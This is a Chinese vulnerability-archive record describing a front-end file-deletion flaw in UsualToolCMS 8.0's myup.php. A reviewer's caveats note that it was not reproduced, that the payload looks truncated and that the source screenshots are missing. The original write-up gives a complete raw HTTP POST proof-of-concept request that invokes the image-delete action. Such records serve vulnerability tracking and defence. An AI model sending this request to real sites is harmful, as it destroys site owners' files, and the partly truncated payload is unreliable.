---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0Release myup.php"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 myup.php 前台任意文件删除"
prerequisites: "来源所述条件，未列明部分仍待核：myup图片删除动作可达且服务账户可删；路径限制为网站内"
side_effects: "未执行；本文需注意的操作影响：无登录状态和删除成功响应，不能只裸POST认定未认证"
source_status: "unknown"
id: "vw-e6352ac02aa54a408f4b2076"
entity_id: "ve-e6352ac02aa54a408f4b2076"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：myup图片删除动作可达且服务账户可删；路径限制为网站内

- **结论使用边界（1）**：正文明确..过滤后只能网站内部，与标题任意范围需限定。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（2）**：payload尾imgurl=./1.ph疑截断为php前一字，需回源；关键源码/结果图全空白。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **操作与副作用边界（3）**：无登录状态和删除成功响应，不能只裸POST认定未认证。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms前台任意文件删除

一、漏洞简介
------------

前台myup.php文件最后一段存在任意文件删除

二、漏洞影响
------------

UsualToolCMS-8.0-Release

三、复现过程
------------

漏洞点：<http://0-sec.org/myup.php>



第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc，





    POST /UsualToolCMS/myup.php HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    X-Forwarded-For: 8.8.8.8
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25

    get=delimg&imgurl=./1.ph
